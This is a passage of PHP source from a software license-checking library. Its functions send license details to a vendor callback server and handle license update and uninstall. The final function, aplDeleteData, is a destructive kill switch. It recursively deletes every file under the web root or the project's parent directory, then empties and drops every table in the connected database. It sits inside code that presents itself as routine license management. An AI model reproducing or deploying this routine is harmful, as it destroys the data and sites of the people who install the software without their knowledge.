                "&root_url=" . rawurlencode($ROOT_URL) .
                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_update.php", $post_info, $ROOT_URL);
            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
        }
        return $notifications_array;
    }

    function incevioUninstallLicense($MYSQLI_LINK = null)
    {
        $notifications_array = array();
        $apl_core_notifications = aplCheckSettings();

        if (!empty($apl_core_notifications)) {
            $notifications_array["notification_case"] = "notification_script_corrupted";
            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
        } elseif (!aplCheckData($MYSQLI_LINK)) {
            $notifications_array["notification_case"] = "notification_license_corrupted";
            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
        } else {
            extract(aplGetLicenseData($MYSQLI_LINK));
            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
                "&license_code=" . rawurlencode($LICENSE_CODE) .
                "&root_url=" . rawurlencode($ROOT_URL) .
                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_uninstall.php", $post_info, $ROOT_URL);
            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

            if ($notifications_array["notification_case"] == "notification_license_ok") {
                if (APL_STORAGE == "DATABASE") {
                    mysqli_query($MYSQLI_LINK, "DELETE FROM " . APL_DATABASE_TABLE);
                    mysqli_query($MYSQLI_LINK, "DROP TABLE " . APL_DATABASE_TABLE);
                }
                if (APL_STORAGE == "FILE") {
                    $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
                    @fclose($handle);
                }
            }
        }
        return $notifications_array;
    }

    function aplDeleteData($MYSQLI_LINK = null)
    {
        if (APL_GOD_MODE == "YES" && isset($_SERVER["DOCUMENT_ROOT"])) {
            $root_directory = $_SERVER["DOCUMENT_ROOT"];
        } else {
            $root_directory = dirname(__DIR__);
        }

        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) {
            $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        }
        rmdir($root_directory);

        if (APL_STORAGE == "DATABASE") {
            $database_tables_array = array();
            $table_list_results = mysqli_query($MYSQLI_LINK, "SHOW TABLES");
            while ($table_list_row = mysqli_fetch_row($table_list_results)) {
                $database_tables_array[] = $table_list_row[0];
            }
            if (!empty($database_tables_array)) {
                foreach ($database_tables_array as $table_name) {
                    mysqli_query($MYSQLI_LINK, "DELETE FROM {$table_name}");
                }
                foreach ($database_tables_array as $table_name) {
                    mysqli_query($MYSQLI_LINK, "DROP TABLE {$table_name}");
                }
            }
        }
        exit;
    }
}